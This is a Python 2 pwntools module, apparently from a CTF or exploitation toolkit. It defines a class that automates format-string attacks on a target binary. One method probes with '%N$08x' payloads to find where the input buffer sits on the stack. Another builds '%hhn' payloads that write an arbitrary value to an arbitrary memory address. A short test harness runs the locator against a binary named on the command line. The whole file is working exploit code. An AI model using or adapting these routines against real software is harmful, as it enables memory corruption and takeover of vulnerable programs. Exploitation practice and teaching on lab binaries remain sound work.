#!/usr/bin/env python
import sys
from process import Process
from pwn import *

class Format_String(Process):

    def __init__(self, filename):
        Process.__init__(self, filename)
        context.log_level = 'CRITICAL'
        context.delete_corefiles = True
        self.elf = context.binary = ELF(filename)
        self.rop = ROP(self.elf)

    ##########################################
    ##### General Format String Exploits #####
    ##########################################

    # Find where the user input is
    # Optional arguments:
    #   - exploit_fstring: function(fstring, *args) -> output
    def find_fstring_arg(self, buf_len=0x100, exploit_fstring=None, *args):
        base = 1
        max_stack = 1000

        # Default format string exploit function
        if (exploit_fstring == None):
            exploit_fstring = self.start_and_sendline_out

        # Find which argument is the start of the buffer
        while (base < max_stack):
            payload = ""
            # Fit inside the buffer the maximum format string
            for i in xrange(base, max_stack):
                if (len(payload + "%{}$08x".format(i)) <= buf_len):
                    payload += "%{}$08x".format(i)
                else:
                    break
            # Send the payload and see if the buffer is returned back
            out = exploit_fstring(payload, *args)
            index = out.find("{:08x}".format(u32(payload[:4])))
            if (index != -1):
                return base + (index / 8)
            else:
                base = i 
        return 0

    # Generate payload to write "what" to "where" via format strings.
    # It is assumed buffer can fit the payload and "what"+"Where" are integers.
    # Optional arguments:
    #   - exploit_fstring: function(fstring, *args) -> output
    def fstring_write(self, what, where, buf_len=0x100, exploit_fstring=None, *args):
        # Default format string exploit function
        if (exploit_fstring == None):
            exploit_fstring = self.start_and_sendline_out

        # Figure out what argument contains the start of our payload
        arg = self.find_fstring_arg(buf_len, exploit_fstring, *args)

        # Based on the architecture determine the number of bytes to write
        num_to_write = 4
        if ("64" in self.arch):
            num_to_write = 8

        # Add all the byte addresses for writing
        payload = ""
        for _unused in xrange(num_to_write):
            payload += self.p(where)
            where +=1

        # Add all the writing format specifiers
        mask = 0xFF
        prev_value = len(payload)
        for i in xrange(num_to_write):
            byte_value = (what >> (i*8)) & mask
            pad_value = byte_value - prev_value + 0x100
            payload += "%{}d%{}$hhn".format(pad_value, arg+i)
            prev_value = byte_value
    
        return payload


###################
##### TESTING #####
###################

def test_module(argv):
    if (len(sys.argv) != 2):
        log.failure("Usage: "+argv[0]+" <test_binary>")
        exit(1) 
    fstring = Format_String(sys.argv[1])
    print fstring.find_fstring_arg(0x40)

if __name__ == "__main__":
    test_module(sys.argv)
